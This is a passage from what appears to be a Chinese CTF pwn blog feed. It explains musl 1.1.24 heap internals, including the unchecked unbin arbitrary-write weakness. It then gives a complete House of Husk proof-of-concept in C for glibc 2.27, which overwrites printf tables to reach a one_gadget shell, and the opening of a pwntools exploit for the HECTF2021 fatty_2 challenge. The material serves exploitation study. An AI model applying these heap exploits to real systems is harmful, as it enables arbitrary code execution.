的状态。<strong>chunk为0x20字节对齐的！！！</strong></p><h4 id="mal"><a href="#mal" class="headerlink" title="mal"></a>mal</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">volatile</span> <span class="token class-name">uint64_t</span> binmap<span class="token punctuation">;</span>   <span class="token comment">// 记录bins中bins[i]是否非空</span>    <span class="token keyword">struct</span> <span class="token class-name">bin</span> bins<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">volatile</span> <span class="token keyword">int</span> free_lock<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> mal<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>mal</code>结构体类似于 glibc 中的<code>arena</code>，记录着堆的状态，有三个成员：64位无符号整数<code>binmap</code>、链表头部数组<code>bins</code>和锁<code>free_lock</code>。<code>binmap</code>记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p><h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">bin</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">volatile</span> <span class="token keyword">int</span> lock<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>head<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>tail<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bin 链表头部的结构如上。</p><p><code>head</code>和<code>tail</code>指针分别指向首部和尾部的 chunk，同时首部 chunk 的<code>prev</code>指针和尾部 chunk 的<code>next</code>指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，<code>head</code>和<code>tail</code>指针等于 0 或者指向链表头部自身。</p><ul><li><p>bin如果为空，head和tail为0或者指向bin自身。</p></li><li><p>bin如果非空，head和tail分别指向头和尾的chunk，头chunk的prev和尾chunk的next指向bin，构成双向链表。</p></li></ul><table><thead><tr><th>bin 下标 i</th><th>chunk 大小个数</th><th>chunk 大小范围</th><th>下标 i 与 chunk 大小范围的关系</th></tr></thead><tbody><tr><td>0-31</td><td>1</td><td>0x20 – 0x400</td><td>(i+1) * 0x20</td></tr></tbody></table><p>可以从源码中的<a href="https://github.com/bminor/musl/blob/v1.1.24/src/malloc/malloc.c#L96"><code>bin_index_up</code></a>推导出, 前 32 个 bin 类似 fastbin 和 small bin，每个 bin 只对应一种大小的 chunk；后 32 个 bin 则类似 large bin，一个 bin 对应多种大小的 chunk。</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>源码:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>c<span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token comment">// 使size n对齐</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">adjust_size</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> MMAP_THRESHOLD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// n达到了mmap分配的阈值（0x38000），使用mmap分配</span><span class="token class-name">size_t</span> len <span class="token operator">=</span> n <span class="token operator">+</span> OVERHEAD <span class="token operator">+</span> PAGE_SIZE <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token operator">-</span>PAGE_SIZE<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>base <span class="token operator">=</span> <span class="token function">__mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span>MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>base <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>base <span class="token operator">+</span> SIZE_ALIGN <span class="token operator">-</span> OVERHEAD<span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">-></span>csize <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token punctuation">(</span>SIZE_ALIGN <span class="token operator">-</span> OVERHEAD<span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">-></span>psize <span class="token operator">=</span> SIZE_ALIGN <span class="token operator">-</span> OVERHEAD<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">CHUNK_TO_MEM</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 计算size对应的bin下标</span>i <span class="token operator">=</span> <span class="token function">bin_index_up</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">uint64_t</span> mask <span class="token operator">=</span> mal<span class="token punctuation">.</span>binmap <span class="token operator">&amp;</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">1ULL</span><span class="token operator">&lt;&lt;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 查找size > n的所有bin</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mask<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 没有能满足要求的bin，使用expand_heap申请新chunk</span>c <span class="token operator">=</span> <span class="token function">expand_heap</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_rev</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>x <span class="token operator">=</span> c<span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">PREV_CHUNK</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">NEXT_CHUNK</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-></span>psize <span class="token operator">=</span> c<span class="token operator">-></span>csize <span class="token operator">=</span>x<span class="token operator">-></span>csize <span class="token operator">+</span> <span class="token function">CHUNK_SIZE</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>j <span class="token operator">=</span> <span class="token function">first_set</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取最符合的size对应的bin</span><span class="token function">lock_bin</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 对该bin加锁</span>c <span class="token operator">=</span> mal<span class="token punctuation">.</span>bins<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>head<span class="token punctuation">;</span><span class="token comment">// 取出bin头</span><span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token function">BIN_TO_CHUNK</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">pretrim</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">unbin</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用 pretrim 分割 c，使用 unbin 从链表中取出 c</span><span class="token function">unlock_bin</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unlock_bin</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 回收 c 中大小超过 n 的部分</span><span class="token comment">/* Now patch up in case we over-allocated */</span><span class="token function">trim</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">CHUNK_TO_MEM</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分配过程主要有一下几个步骤：</p><ul><li>增加chunk头部，并且size对其0x20</li><li>如果size大于MMAP_THRESHOLD，则使用mmap分配一块大小为size的内存</li><li>如果size小于MMAP_THRESHOLD，计算size对应的bin下标：</li><li>如果所有的bin都为空，延展堆空间，分配一个新的chunk；</li><li>如果存在非空bin，选择与size最接近的bin，取bin首部的chunk，如果该chunk大小远大于size，使用pretrim分割chunk，否则unbin从链表中取出chunk。</li><li>最后对chunk进行trim，主要是回收超过size的内存，减少内存浪费。</li></ul><h3 id="unbin"><a href="#unbin" class="headerlink" title="unbin"></a>unbin</h3><p>源码:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unbin</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>c<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token operator">-></span>prev <span class="token operator">==</span> c<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token function">a_and_64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mal<span class="token punctuation">.</span>binmap<span class="token punctuation">,</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1ULL</span><span class="token operator">&lt;&lt;</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">-></span>prev<span class="token operator">-></span>next <span class="token operator">=</span> c<span class="token operator">-></span>next<span class="token punctuation">;</span>c<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> c<span class="token operator">-></span>prev<span class="token punctuation">;</span>c<span class="token operator">-></span>csize <span class="token operator">|=</span> C_INUSE<span class="token punctuation">;</span><span class="token function">NEXT_CHUNK</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">-></span>psize <span class="token operator">|=</span> C_INUSE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ubin</code>相当于早期的<code>unlink</code>没有对双向链表进行检查，所以可以造成任意地址写。</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>self <span class="token operator">=</span> <span class="token function">MEM_TO_CHUNK</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 若 csize 没有设置 inuse 标志位，检查是否为 mmap chunk 或者 double free</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IS_MMAPPED</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">unmap_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token function">__bin_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unmap_chunk</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>self<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> extra <span class="token operator">=</span> self<span class="token operator">-></span>psize<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>base <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>self <span class="token operator">-</span> extra<span class="token punctuation">;</span><span class="token class-name">size_t</span> len <span class="token operator">=</span> <span class="token function">CHUNK_SIZE</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">+</span> extra<span class="token punctuation">;</span><span class="token comment">/* Crash on double free */</span> <span class="token comment">// 如果psize设置了inuse位，说明该chunk不是来着mmap分配的，double free</span><span class="token keyword">if</span> <span class="token punctuation">(</span>extra <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">a_crash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">__munmap</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态堆内存"><a href="#静态堆内存" class="headerlink" title="静态堆内存"></a>静态堆内存</h3><p>程序初始化之后，查看mal结构体，会发现bins非空，有一个libc中的堆区和程序段的堆区。</p><p><img src="https://pic.imgdb.cn/item/619b96db2ab3f51d91a46583.png"></p><h2 id="musl-1-2-2"><a href="#musl-1-2-2" class="headerlink" title="musl-1.2.2"></a>musl-1.2.2</h2><p>musl-1.2.2是musl-1.2.x系列比较现在题目最多见的版本,同时和musl-1.1.x的差别也比较大,新增了不少新东西.</p><p><strong>v1.2.2</strong>源码 : <a href="https://musl.libc.org/releases/musl-1.2.2.tar.gz">musl-1.2.2</a></p><p>未完待续………..</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> musl </tag>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-house_of_husk</title>
      <link href="//post/pwn-house-of-husk.html"/>
      <url>//post/pwn-house-of-husk.html</url>
      
        <content type="html"><![CDATA[<h1 id="PWN-House-of-Husk"><a href="#PWN-House-of-Husk" class="headerlink" title="[PWN]House of Husk"></a>[PWN]House of Husk</h1><p>HECTF上的一题,本以为就是简单的fastbin直接打,但是那题限制了chunk的申请次数.</p><p>赛后和出题人对线才知道这题主要考察<code>House of Husk</code>.</p><p>(但是被有些师傅非预期了hhh,<strong>通过主动构造double free也会调用一次malloc_hook</strong>)</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Husk POC:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** * This is a Proof-of-Concept for House of Husk * This PoC is supposed to be run with libc-2.27. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">offset2size</span><span class="token expression"><span class="token punctuation">(</span>ofs<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ofs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAIN_ARENA</span>       <span class="token expression"><span class="token number">0x3ebc40</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAIN_ARENA_DELTA</span> <span class="token expression"><span class="token number">0x60</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">GLOBAL_MAX_FAST</span>  <span class="token expression"><span class="token number">0x3ed940</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PRINTF_FUNCTABLE</span> <span class="token expression"><span class="token number">0x3f0658</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PRINTF_ARGINFO</span>   <span class="token expression"><span class="token number">0x3ec870</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ONE_GADGET</span>       <span class="token expression"><span class="token number">0x10a38c</span></span></span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> libc_base<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// make printf quiet</span>  <span class="token comment">/* leak libc */</span>  a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* UAF chunk */</span>  a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">offset2size</span><span class="token punctuation">(</span>PRINTF_FUNCTABLE <span class="token operator">-</span> MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">offset2size</span><span class="token punctuation">(</span>PRINTF_ARGINFO <span class="token operator">-</span> MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* avoid consolidation */</span>  <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  libc_base <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> MAIN_ARENA <span class="token operator">-</span> MAIN_ARENA_DELTA<span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"libc @ 0x%lx\n"</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* prepare fake printf arginfo table */</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token char">'X'</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> libc_base <span class="token operator">+</span> ONE_GADGET<span class="token punctuation">;</span>    <span class="token comment">//now __printf_arginfo_table['X'] = one_gadget;</span>    <span class="token comment">//*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;</span>  <span class="token comment">/* unsorted bin attack */</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> libc_base <span class="token operator">+</span> GLOBAL_MAX_FAST <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* overwrite global_max_fast */</span>  <span class="token comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span>  <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// __printf_function_table => a heap_addr which is not NULL</span>  <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//__printf_arginfo_table => one_gadget</span>  <span class="token comment">/* ignite! */</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%X"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>POC分析:</strong></p><p>这里使用的poc就直接用攻击发现者提供的源代码，运行环境为<code>ubuntu 18.04/glibc 2.27</code>，编译命令为<code>gcc ./poc.c -g -fPIE -no-pie -o poc</code>(关闭pie方便调试)。</p><p>代码模拟了UAF漏洞，先分配一个超过fastbin的块，释放之后会进入<code>unsorted bin</code>。预先分配两个chunk，第一个用来伪造<code>__printf_function_table</code>，第二个用来伪造<code>__printf_arginfo_table</code>。将<code>__printf_arginfo_table[&#39;X&#39;]</code>处的函数指针改为<code>one_gadget</code>。</p><p>使用<code>unsorted bin attack</code>改写<code>global_max_fast</code>为<code>main_arena+88</code>从而使得释放的所有块都按fastbin处理(都是超过large bin大小的堆块不会进tcache)。</p><p>在这里有一个很重要的知识就是fastbin的堆块地址会存放在main_arena中，从<code>main_arena+8</code>开始存放<code>fastbin[0x20]</code>的头指针，一直往后推，由于平时的fastbin默认阈值为<code>0x80</code>，所以在glibc-2.23的环境下最多存放到main_arena+0x48，现在我们将阈值改为<code>0x7f*</code>导致几乎所有sz的chunk都被当做fastbin，其地址会从main_arena+8开始，根据sz不同往libc覆写堆地址。如此一来，只要我们计算好<code>__printf_arginfo_table</code>和<code>main_arena</code>的地址偏移，进而得到合适的<code>sz</code>，就可以在之后释放这个伪造table的chunk时覆写<code>__printf_arginfo_table</code>为<code>heap_addr</code>。</p><p>有了上述知识铺垫，整个攻击流程就比较清晰了，总结一下，先UAF改global_max_fast为main_arena+88，之后释放合适sz的块到fastbin，从而覆写<code>__printf_arginfo_table</code>表为heap地址，<code>heap[&#39;X&#39;]</code>被覆写为了one_gadget，在调用这个函数指针时即可get shell。</p><h2 id="HECTF2021-fatty-2"><a href="#HECTF2021-fatty-2" class="headerlink" title="HECTF2021 fatty_2"></a>HECTF2021 fatty_2</h2><p>libc2.23的程序,</p><p>拥有add ,free ,show 的经典菜单题</p><p>其中free没有把指针置0,导致的UAF</p><p>但是一共只能申请4个chunk</p><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>直接泄露libc然后fastbinattack打malloc_hook,最后手动触发double free调用malloc_hook来getshell</p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p><strong>House of Husk</strong></p><p>更具上面的POC分析,由于函数的输出使用printf(“%X”);</p><p>这里我们需要修改<code>__printf_arginfo_table</code>的[‘X’]=onegadget.</p><p>同时保证<code>__printf_function_table</code>不为0.</p><p>由于只有4个chunk需要小心构造</p><p>第一个chunk用来构造unsortedbin泄露libc,同时利用unsortedbinAttack修改<code>global_max_fast</code>,使所有大小的chunk都能被放到fastbins中去,由于fastbin中的指针由main_arena开始,如果一个非常大从chunk可以被当成fastbin释放,会将main_arena[size/0x10]修改为指向改chunk的指针,这里我们伪造<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>两个表,就可以把他们指向heap上的chunk并在其中伪造[‘X’]的指针.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delet</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span 